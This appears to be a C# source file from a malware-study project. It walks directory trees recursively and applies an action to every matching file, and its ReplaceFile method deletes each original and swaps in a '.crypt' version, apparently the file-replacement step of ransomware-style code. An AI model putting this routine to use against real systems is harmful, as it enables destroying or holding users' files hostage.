using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace Virologie
{
    class FileExplorer
    {
        public delegate void FileAction(string filename);

        public void ApplyTo(string startDir, IEnumerable<string> filters, FileAction action)
        {
            var enumerable = filters as IList<string> ?? filters.ToList();
            foreach (var filter in enumerable)
            {
                var files = EnumerateFiles(startDir, filter);
                if (files == null)
                    return;
                foreach (var file in files)
                {
                    action(file);
                }
            } try
            {

                foreach (var directory in Directory.GetDirectories(startDir))
                {
                    ApplyTo(directory, enumerable, action);
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        private IEnumerable<string> EnumerateFiles(string startDir, string filter)
        {
            try
            {
                return Directory.GetFiles(startDir, filter, SearchOption.TopDirectoryOnly);
            }
            catch (Exception)
            {

                return null;
            }
        }

        static public void ReplaceFile(string name)
        {
            if (!File.Exists(name + ".crypt")) return;
            File.Delete(name);
            File.Move(name + ".crypt", name);
        }
    }
}
